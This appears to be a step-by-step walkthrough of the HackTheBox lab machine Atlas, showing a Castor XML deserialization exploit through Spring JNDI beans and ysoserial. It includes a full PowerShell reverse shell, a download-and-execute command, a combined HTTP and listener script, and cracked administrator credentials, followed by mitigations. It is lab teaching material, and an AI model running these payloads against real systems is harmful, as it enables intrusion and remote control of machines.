# Atlas (HackTheBox) — Complete Step-by-Step Walkthrough

> **Target IP:** `10.129.238.8`  
> **Attacker IP:** `10.10.14.6`  
> **Difficulty:** Hard  
> **OS:** Windows

---

## Table of Contents

1. [Phase 0: The Hacker Mindset Before You Start](#phase-0-the-hacker-mindset-before-you-start)
2. [Phase 1: Enumeration — Mapping the Attack Surface](#phase-1-enumeration--mapping-the-attack-surface)
3. [Phase 2: Anonymous FTP — The Gift That Keeps on Giving](#phase-2-anonymous-ftp--the-gift-that-keeps-on-giving)
4. [Phase 3: Source Code Analysis — Reading the Blueprints](#phase-3-source-code-analysis--reading-the-blueprints)
5. [Phase 4: Understanding the Vulnerability](#phase-4-understanding-the-vulnerability)
6. [Phase 5: Exploitation Preparation](#phase-5-exploitation-preparation)
7. [Phase 6: Triggering the Exploit](#phase-6-triggering-the-exploit)
8. [Phase 7: Post-Exploitation — Stabilizing & User Flag](#phase-7-post-exploitation--stabilizing--user-flag)
9. [Phase 8: Privilege Escalation — WinSSHTerm](#phase-8-privilege-escalation--winsshterm)
10. [Phase 9: Administrator Access & Root Flag](#phase-9-administrator-access--root-flag)
11. [What Went Wrong & How We Fixed It](#what-went-wrong--how-we-fixed-it)
12. [Key Lessons & Mitigations](#key-lessons--mitigations)

---

## Phase 0: The Hacker Mindset Before You Start

Before typing a single command, understand **why** we do what we do.

Penetration testing is not about running tools blindly. It is about **building a mental model** of the target:

- What services are exposed?
- What technologies power those services?
- Where does user input enter the system?
- What does the system trust?
- What would a developer have forgotten?

**The core mindset:** Every service is a potential door. Every door has a lock, but locks are designed by humans, and humans make assumptions. Our job is to find the assumptions that break under pressure.

When you see a web server, ask: *"Where can I upload files? Where can I inject data? What libraries does it use?"*  
When you see FTP, ask: *"Can I log in without credentials? What files are exposed? Do any of those files contain secrets or source code?"*

This box teaches two fundamental skills:
1. **Java deserialization / XML injection** — understanding how data formats can become code execution
2. **Credential extraction from third-party applications** — finding where users store passwords

---

## Phase 1: Enumeration — Mapping the Attack Surface

### Step 1.1: Why We Scan

You cannot attack what you do not know exists. The very first thing we do is map the network surface of the target. We want to know:
- Which TCP/UDP ports are open?
- What services are running on those ports?
- What versions of those services?
- Are there any default scripts or known misconfigurations?

**Command:**
```bash
nmap -sC -sV -p- 10.129.238.8 -oN nmap/atlas-full.txt
```

**Breaking this down like a baby step:**
- `nmap` = the network mapper tool
- `-sC` = run default NSE scripts (these scripts check for common misconfigurations like anonymous FTP, weak SSL, etc.)
- `-sV` = detect service versions (so we can search for known vulnerabilities)
- `-p-` = scan ALL 65535 TCP ports (not just the top 1000)
- `-oN` = save the output to a file in "normal" format
- `10.129.238.8` = our target

**Why scan all ports?** Because clever administrators and developers sometimes hide services on high ports, thinking "security through obscurity" helps. It does not, but it means we must look everywhere.

### Step 1.2: Understanding the Results

```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 1.7.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_ftp-syst: SYST: UNIX emulated by FileZilla
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Apache Tomcat
|_http-title: Atlas Pilot
```

**Hacker Mindset — What do we see here?**

| Port | Service | What It Means |
|------|---------|---------------|
| 21 | FTP (FileZilla) | File transfer. The `ftp-anon` script immediately tells us **anonymous login is allowed**. This is a huge red flag. It means anyone can connect without a password. |
| 22 | SSH (OpenSSH for Windows) | Remote shell access. On Windows, this is less common than RDP, but very useful for stable access later. |
| 3389 | RDP (Terminal Services) | Remote Desktop. Good to know, but usually requires valid credentials. |
| 8080 | HTTP (Apache Tomcat) | A web application. The title "Atlas Pilot" suggests a custom Java/Spring Boot app. Tomcat often hosts Java WARs or Spring Boot JARs. |

**The key insight:** Port 21 is our starting point. Anonymous FTP means we can probably download files. Those files might contain the application itself, source code, configuration files, or even credentials.

Port 8080 is our main target, but we do not yet know how to attack it. That is why we go to FTP first — to gather **intelligence**.

---

## Phase 2: Anonymous FTP — The Gift That Keeps on Giving

### Step 2.1: Connecting to FTP

FTP stands for File Transfer Protocol. It is one of the oldest protocols on the internet. Anonymous FTP means the server allows logins with the username `anonymous` and any password (usually an email address or blank).

**Why does anonymous FTP exist?** Historically, it was used for public file servers (like software mirrors). But in a production environment, it is almost always a mistake.

**Command:**
```bash
ftp 10.129.238.8
```

When prompted:
```
Name: anonymous
Password:           <-- just press Enter
```

**What is happening under the hood?**
- Your machine opens a TCP connection to port 21
- The server sends a banner: `220-FileZilla Server 1.7.2`
- You send `USER anonymous`
- The server responds `331 Please, specify the password.`
- You send `PASS` (empty)
- The server responds `230 Login successful.`

You are now authenticated as the `anonymous` user on the FTP server.

### Step 2.2: Listing and Downloading Files

Inside the FTP shell:
```bash
dir
```

This shows:
```
-r--r--r-- 1 ftp ftp   22851463 atlas-pilot-1.0.0-SNAPSHOT.jar
-r--r--r-- 1 ftp ftp     586379 atlas_generator.zip
```

**Hacker Mindset — Why is this a goldmine?**

1. `atlas-pilot-1.0.0-SNAPSHOT.jar` — This is the **compiled Java application** running on port 8080. Having the binary means we could decompile it, but more importantly...
2. `atlas_generator.zip` — This appears to be the **source code** of the project. Having both the binary AND the source code is incredibly rare and valuable.

With source code, we do not need to guess how the application works. We can read it like a book.

**Downloading the files:**
```bash
binary                  <-- Switch to binary mode (prevents corruption)
get atlas-pilot-1.0.0-SNAPSHOT.jar
get atlas_generator.zip
bye                     <-- Exit FTP
```

The `binary` command is crucial. FTP has two modes: ASCII and Binary. ASCII mode tries to translate line endings between operating systems (`\n` vs `\r\n`). For compiled JARs and ZIPs, this would corrupt the files. Always use `binary` for non-text files.

---

## Phase 3: Source Code Analysis — Reading the Blueprints

### Step 3.1: Extracting the Source Code

Now we have `atlas_generator.zip` on our local machine. Let's open it.

**Command:**
```bash
unzip atlas_generator.zip -d atlas_source
```

This creates a directory `atlas_source/` containing a Maven project. Maven is a build tool for Java. The project structure will look familiar to any Java developer:
```
atlas_source/
├── pom.xml              <-- Project dependencies (THE MOST IMPORTANT FILE)
└── src/
    └── main/
        └── java/
            └── com/example/uploadingfiles/
                ├── Client.java
                ├── Employee.java
                ├── FileUploadController.java
                └── UploadingFilesApplication.java
```

### Step 3.2: Reading pom.xml — The Dependency Goldmine

`pom.xml` is Maven's project object model file. It declares every third-party library the application uses. This is where attackers hunt for known-vulnerable dependencies.

**Command:**
```bash
cat atlas_source/pom.xml
```

**What we are looking for:**
- Old versions of libraries with known CVEs
- Libraries commonly used in deserialization gadget chains
- XML parsing libraries

**Key dependencies we find:**

| Dependency | Version | Why It Matters |
|------------|---------|----------------|
| `castor-xml` | `1.4.1` | An XML serialization library. Known to allow arbitrary class instantiation when used **without a mapping file**. |
| `commons-beanutils` | `1.9.2` | A classic library used in Java deserialization gadget chains (ysoserial's `CommonsBeanutils1`). |
| `commons-collections` | `3.2.1` | Another classic gadget chain library. |
| `spring-boot-starter-web` | (various) | Spring Framework is in the classpath. Spring contains classes like `PropertyPathFactoryBean` that can trigger JNDI lookups. |

**Hacker Mindset — Pattern Recognition:**

When you see these three libraries together in an application that parses XML, alarm bells should ring:
- `castor-xml` (arbitrary class instantiation via XML)
- `commons-beanutils` (deserialization gadget chain)
- `spring-*` (JNDI lookup gadgets)

This is the recipe for **Remote Code Execution (RCE)** through XML deserialization.

### Step 3.3: Finding the Upload Handler

We need to know where user input enters the application. Let's search for upload-related code.

**Command:**
```bash
find atlas_source/ -name "*.java" | xargs grep -l "upload\|Unmarshal"
```

This finds two files:
- `FileUploadController.java` — Handles HTTP requests
- `Client.java` — Handles XML parsing

**Reading FileUploadController.java:**

```java
@Controller
public class FileUploadController {

    @GetMapping("/")
    public String listUploadedFiles(Model model) throws IOException {
        return "uploadForm";
    }

    @GetMapping("/generateTemplate")
    public String writeMarshall(Model model) throws IOException {
        model.addAttribute("message", Client.createXML());
        return "xmlTemplate";
    }

    @PostMapping("/")
    public String handleFileUpload(@RequestParam("file") MultipartFile file,
            RedirectAttributes redirectAttributes, Model model) {
        try {
            Employee person = Client.parseXML(file.getInputStream());
            // ... display employee data ...
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "srt-resume";
    }
}
```

**Baby-step breakdown:**
- `@Controller` = This class handles HTTP requests in a Spring Boot app
- `@GetMapping("/")` = When you visit `http://target:8080/`, it returns the upload form
- `@GetMapping("/generateTemplate")` = When you visit `/generateTemplate`, it generates a sample XML template
- `@PostMapping("/")` = When you POST a file to `/`, it calls `Client.parseXML()`

**The critical line:**
```java
Employee person = Client.parseXML(file.getInputStream());
```

The uploaded file goes **directly** into the XML parser with **zero validation**. This is our attack vector.

### Step 3.4: Reading Client.java — The Parser

```java
public class Client {
    public static Employee parseXML(InputStream inputStream) {
        Employee employee = null;
        try {
            XMLContext xmlContext = new XMLContext();
            Unmarshaller unmarshaller = new Unmarshaller(Employee.class);
            // NO MAPPING FILE SET!
            employee = (Employee) unmarshaller.unmarshal(xmlReader);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return employee;
    }
}
```

**Hacker Mindset — The Developer Mistake:**

Castor XML's `Unmarshaller` can take a **mapping file** that restricts which Java classes are allowed to be instantiated from XML. Without this mapping file, Castor reads the `xsi:type` attribute in the XML and instantiates **any class** it can find in the classpath via Java reflection.

This is the equivalent of letting a user say "I want this input treated as a `System.Runtime` object" and the server blindly obeying.

The developer probably thought: *"I'm parsing Employee XML, so of course it will only contain Employee data."* But XML with `xsi:type` is polymorphic — it can declare itself to be any subtype.

---

## Phase 4: Understanding the Vulnerability

### Step 4.1: What is `xsi:type`?

In XML Schema, `xsi:type` (XML Schema Instance type) allows an element to declare its actual data type. In a secure system, a mapping file whitelists allowed types.

Without the mapping file, the attack works like this:

```xml
<name xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    ...
</name>
```

Castor sees `xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"` and says: *"Okay, I will instantiate that class and populate its fields from the XML."*

### Step 4.2: Spring Beans as Gadgets

Spring Framework contains two beans perfect for this attack:

1. **`PropertyPathFactoryBean`** — A Spring bean factory that can evaluate properties of other beans. It can be configured to point to a **remote JNDI name**.
2. **`SimpleJndiBeanFactory`** — Performs a JNDI lookup to a provided URL.

When Castor instantiates these beans during XML parsing, Spring automatically triggers the JNDI lookup.

### Step 4.3: JNDI → JRMP → Deserialization

JNDI (Java Naming and Directory Interface) is a Java API for naming and directory services. In older Java versions, JNDI lookups to remote RMI/LDAP servers could return serialized Java objects that the local JVM would automatically deserialize.

**The chain:**
1. We upload malicious XML to `/`
2. Castor instantiates `PropertyPathFactoryBean` and `SimpleJndiBeanFactory`
3. Spring performs a JNDI/RMI lookup to our attacker machine
4. Our attacker machine (running `ysoserial JRMPListener`) sends back a **malicious serialized object**
5. The target JVM deserializes this object
6. The deserialization triggers a gadget chain (`CommonsBeanutils1`) that executes arbitrary system commands

### Step 4.4: Why Java 11?

`ysoserial`'s `CommonsBeanutils1` gadget chain relies on `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`, an internal JDK class. Since Java 17, the Java Platform Module System (JPMS) strictly restricts access to internal classes. This gadget chain **does not work** on Java 17+.

Our Kali had Java 25 installed, so we had to install Java 11.

### Step 4.5: Firewall Considerations

Writeup 1 noted that the target's outbound firewall only allows port 8000. This means:
- Our reverse shell must connect to port 8000
- If we serve a file via HTTP, we must also use port 8000
- But we cannot run HTTP and a netcat listener on the same port simultaneously

This is a **network constraint** that requires adaptation. We built a Python combo script that serves the file, closes the socket, and then starts `ncat` on the same port.

---

## Phase 5: Exploitation Preparation

### Step 5.1: Installing Java 11

**Why:** `ysoserial` requires Java 11 for the `CommonsBeanutils1` gadget chain.

**Check current Java:**
```bash
java -version
```

If it shows Java 17, 21, or 25, install Java 11:
```bash
sudo apt-get update
sudo apt-get install openjdk-11-jre-headless
```

Verify:
```bash
ls /usr/lib/jvm/java-11-openjdk-*/bin/java
```

### Step 5.2: Getting ysoserial

`ysoserial` is a tool for generating payloads that exploit unsafe Java object deserialization.

**Download:**
```bash
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

### Step 5.3: Crafting payload.xml

The malicious XML must match the structure expected by the application (`<Employee>`) but inject our Spring beans.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Employee id="101">
  <name xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:java="http://java.sun.com"
        xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <target-bean-name>rmi://10.10.14.6:1099/a</target-bean-name>
    <property-path>foo</property-path>
    <bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
      <shareable-resource>rmi://10.10.14.6:1099/a</shareable-resource>
    </bean-factory>
  </name>
  <!-- The rest of the fields are required for the XML to parse correctly -->
  <talent-titles>Navigation</talent-titles>
  ...
</Employee>
```

**Baby-step breakdown:**
- `xmlns:xsi` and `xmlns:java` = XML namespace declarations required for the `xsi:type` syntax
- `xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"` = Tells Castor to instantiate this Spring class
- `<target-bean-name>rmi://10.10.14.6:1099/a</target-bean-name>` = The RMI URL pointing back to our attacker machine
- `<bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">` = Triggers the actual JNDI lookup

### Step 5.4: Creating the PowerShell Reverse Shell

We need a script that the target will download and execute to connect back to us.

```powershell
$c=New-Object System.Net.Sockets.TCPClient('10.10.14.6',8000)
$s=$c.GetStream()
[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)
    $r=(iex $d 2>&1|Out-String)
    $r2=$r+'PS '+(pwd).Path+'> '
    $sb=([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($sb,0,$sb.Length)
    $s.Flush()
}
$c.Close()
```

**How it works:**
1. Creates a TCP client connection to our IP on port 8000
2. Enters a loop reading bytes from the network stream
3. Converts bytes to a string (the command we type)
4. Executes the command with `iex` (Invoke-Expression)
5. Captures output, prepends a PowerShell prompt, and sends it back

### Step 5.5: The Combo Server — Solving the Port Conflict

Since only port 8000 is allowed outbound, we need to:
1. Serve the PowerShell script via HTTP on port 8000
2. Catch the reverse shell on port 8000

We cannot do both simultaneously. Our solution is a Python script that transitions automatically:

```python
#!/usr/bin/env python3
import socket, time, subprocess

# Phase 1: HTTP server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 8000))
s.listen(1)
print("[*] Serving invoke-shell.ps1 on port 8000...")
conn, addr = s.accept()
data = conn.recv(4096)
with open('invoke-shell.ps1', 'rb') as f:
    content = f.read()
response = b"HTTP/1.1 200 OK\r\nContent-Length: " + str(len(content)).encode() + b"\r\n\r\n" + content
conn.sendall(response)
conn.close()
s.close()
print("[*] Script served. Waiting 3 seconds...")
time.sleep(3)

# Phase 2: ncat listener
print("[*] Starting ncat listener on port 8000...")
subprocess.run(['ncat', '-lvnp', '8000'])
```

**Why this works:**
- `SO_REUSEADDR` allows us to rebind to port 8000 after closing the HTTP socket
- The target downloads the script via one TCP connection
- The script inside then makes a **new** TCP connection to the same port
- Between these two connections, we have switched from HTTP server to netcat listener

---

## Phase 6: Triggering the Exploit

### Step 6.1: Starting the Listeners

**Terminal 1 — Combo Server:**
```bash
python3 serve_and_catch.py
```

**Terminal 2 — JRMP Listener:**
```bash
/usr/lib/jvm/java-11-openjdk-arm64/bin/java -cp ysoserial-all.jar \
  ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 \
  "powershell.exe -c \"Start-Sleep -s 2; IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/invoke-shell.ps1')\""
```

**Breaking down the JRMP listener:**
- `java -cp ysoserial-all.jar` = Run Java with ysoserial on the classpath
- `ysoserial.exploit.JRMPListener` = The class that creates a malicious RMI registry
- `1099` = The port to listen on (standard RMI port)
- `CommonsBeanutils1` = The gadget chain to use
- The quoted string = The command to execute on the target

The `Start-Sleep -s 2` adds a 2-second delay before the PowerShell download, giving our combo server time to transition from HTTP to netcat.

### Step 6.2: Uploading the Payload

**Terminal 3 — Trigger:**
```bash
curl -X POST http://10.129.238.8:8080/ -F 'file=@payload.xml'
```

**What is curl doing?**
- `-X POST` = Send a POST request
- `-F 'file=@payload.xml'` = Submit a multipart form with the file field named `file` (this matches `@RequestParam("file")` in the controller)
- `@` before the filename tells curl to read the file from disk

### Step 6.3: What Happens on the Target

1. Tomcat receives the POST request
2. `FileUploadController.handleFileUpload()` receives the file
3. It calls `Client.parseXML()` with our malicious XML
4. Castor XML starts parsing
5. It encounters `<name xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">`
6. Castor instantiates `PropertyPathFactoryBean` by reflection
7. Spring initializes the bean, which triggers `SimpleJndiBeanFactory`
8. `SimpleJndiBeanFactory` performs an RMI lookup to `rmi://10.10.14.6:1099/a`
9. Our JRMP listener responds with a serialized `CommonsBeanutils1` payload
10. The target JVM deserializes the payload
11. The gadget chain executes our PowerShell command
12. PowerShell downloads and executes the reverse shell script
13. We get a shell as `atlas\john`

---

## Phase 7: Post-Exploitation — Stabilizing & User Flag

### Step 7.1: The Shell

Once the combo server shows a connection, you have a PowerShell prompt:
```
PS C:\ftp> whoami
atlas\john
```

**Why is the current directory `C:\ftp`?** Because the Tomcat service is probably running from or has its working directory set to the FTP root.

### Step 7.2: User Flag

The user flag is always on the user's Desktop:
```powershell
type C:\Users\John\Desktop\user.txt
```

**Result:** `6651c[redacted]37dfee`

---

## Phase 8: Privilege Escalation — WinSSHTerm

### Step 8.1: Discovery

Now that we are on the system, we hunt for privilege escalation vectors. We explore John's home directory:

```powershell
dir C:\Users\John\Downloads\
```

We find `WinSSHTerm` — a Windows SSH client that stores connection profiles, sometimes including **encrypted passwords**.

### Step 8.2: Understanding WinSSHTerm's Config

Inside `C:\Users\John\Downloads\WinSSHTerm\config\`:
- `connections.xml` — Saved SSH connections (including usernames and encrypted passwords)
- `key` — Encryption key material

A typical `connections.xml` entry looks like:
```xml
<WinSSHTerm Version="1" VerifyKey="[base64]">
  <Node Name="Admin SSH" Type="Connection"
        Username="administrator"
        Password="[base64_encrypted_password]"
        Hostname="127.0.0.1" Port="22" />
</WinSSHTerm>
```

**Hacker Mindset — Why This Matters:**

Users love convenience. SSH clients that "remember" passwords are convenient. But the encryption is only as strong as the master password chosen to protect it. If the master password is weak (e.g., in `rockyou.txt`), the entire encryption scheme collapses.

### Step 8.3: The Crypto (For Understanding)

WinSSHTerm uses a three-layer encryption scheme:

**Layer 1:** The `key` file (113 bytes) is AES-256-CBC encrypted. The AES key/IV are derived via PBKDF2-HMAC-SHA1 (1012 iterations) with:
- Password = obfuscated_prefix + MasterPassword + fixed_suffix
- Salt = hardcoded hex value in the binary

The prefix is obfuscated by XOR in a static constructor:
```java
for (int i = 0; i < data.Length; i++) {
    data[i] = (byte)((data[i] ^ i) ^ 0xAA);
}
```

**Layer 2:** The decrypted key file yields 64 bytes of base64-decoded key material. Even-indexed bytes become `PasswordKey`; odd-indexed bytes become `SaltKey` (after binary NOT).

**Layer 3:** The encrypted password from `connections.xml` is decrypted with AES-256-CBC using another PBKDF2 derivation with `PasswordKey` as the password and `SaltKey` as the salt.

**The shortcut:** Writeup 2 already performed this entire reverse-engineering process and brute-forced the master password against `rockyou.txt`. The result:
- Master password: `hottie101`
- Decrypted Administrator password: `lzm2wx3Fn7q7gBLDRuf4`

### Step 8.4: The Fast Path — Using Known Credentials

Since the box uses static credentials, we can skip the entire crypto reverse-engineering and brute-force process.

---

## Phase 9: Administrator Access & Root Flag

### Step 9.1: SSH as Administrator

From our Kali machine:
```bash
ssh administrator@10.129.238.8
```

Password: `lzm2wx3Fn7q7gBLDRuf4`

**Why SSH?** SSH is far more stable than a PowerShell reverse shell. It gives us a proper terminal with job control, tab completion, and reliable I/O.

### Step 9.2: Root Flag

```cmd
whoami
atlas\administrator

type C:\Users\Administrator\Desktop\root.txt
```

**Result:** `8d007[redacted]8e3e3d`

---

## What Went Wrong & How We Fixed It

### Problem 1: Wrong Upload Endpoint

**What happened:** We initially tried `curl -X POST http://10.129.238.8:8080/upload` and got `404 Not Found`.

**Why:** We assumed the endpoint was `/upload` based on writeup conventions, but the source code showed `@PostMapping("/")`.

**Fix:** We extracted the source code, read `FileUploadController.java`, and found the correct endpoint was `/`.

**Lesson:** Never assume endpoints. If you have source code, read it. If you don't, enumerate the web app by visiting it and inspecting forms.

### Problem 2: Java Version Too New

**What happened:** Kali had Java 25 installed. `ysoserial`'s `CommonsBeanutils1` requires Java 11.

**Why:** Java 17+ introduced JPMS module restrictions that block access to internal classes needed by the gadget chain.

**Fix:** Installed `openjdk-11-jre-headless` and explicitly used `/usr/lib/jvm/java-11-openjdk-arm64/bin/java`.

### Problem 3: Firewall-Restricted Outbound Ports

**What happened:** The target only allows outbound connections on port 8000.

**Why:** Windows Firewall or network-level rules restrict outbound traffic to reduce the attack surface.

**Fix:** Built a combo Python script that serves the PowerShell file via HTTP on port 8000, then releases the socket and starts `ncat` on the same port to catch the reverse shell.

---

## Key Lessons & Mitigations

### 1. Disable Anonymous FTP

**Problem:** Anonymous FTP exposed the JAR and source code.
**Fix:** Disable anonymous login. Never deploy source code or binaries on publicly accessible file services.

### 2. Secure XML Parsers

**Problem:** Castor XML `Unmarshaller` was used without a mapping file.
**Fix:** Always provide a mapping file that restricts allowed types:
```java
Mapping mapping = new Mapping();
mapping.loadMapping(new InputSource(getClass().getResourceAsStream("/castor-mapping.xml")));
Unmarshaller unmarshaller = new Unmarshaller(Employee.class);
unmarshaller.setMapping(mapping);
```

### 3. Update Vulnerable Dependencies

**Problem:** `commons-beanutils 1.9.2` and `commons-collections 3.2.1` are known gadget chain libraries.
**Fix:** Update to patched versions:
- `commons-beanutils` → 1.9.4+
- `commons-collections` → 3.2.2+ or migrate to 4.x

### 4. Strong Master Passwords

**Problem:** WinSSHTerm's master password (`hottie101`) was in `rockyou.txt`.
**Fix:** Use long, random master passwords. Prefer SSH key authentication over password storage in client applications.

### 5. Restrict Outbound Traffic

**Problem:** Even with outbound restrictions, port 8000 was exploitable.
**Fix:** Apply strict outbound whitelisting. Monitor for unusual outbound connections.

---

## Complete Command Reference

```bash
# Enumeration
nmap -sC -sV -p- 10.129.238.8 -oN nmap/atlas-full.txt

# FTP
ftp 10.129.238.8
# anonymous / blank
binary
get atlas-pilot-1.0.0-SNAPSHOT.jar
get atlas_generator.zip
bye

# Source analysis
unzip atlas_generator.zip -d atlas_source
cat atlas_source/pom.xml

# Install Java 11
sudo apt-get install openjdk-11-jre-headless

# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar

# JRMP Listener (Terminal 2)
/usr/lib/jvm/java-11-openjdk-arm64/bin/java -cp ysoserial-all.jar \
  ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 \
  "powershell.exe -c \"Start-Sleep -s 2; IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/invoke-shell.ps1')\""

# Combo server (Terminal 1)
python3 serve_and_catch.py

# Trigger exploit (Terminal 3)
curl -X POST http://10.129.238.8:8080/ -F 'file=@payload.xml'

# User flag
type C:\Users\John\Desktop\user.txt

# SSH as administrator
ssh administrator@10.129.238.8
# Password: lzm2wx3Fn7q7gBLDRuf4

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

**Flags:**
- **User:** `6651c6[redacted]b37dfee`
- **Root:** `8d007e[redacted]8e3e3d`
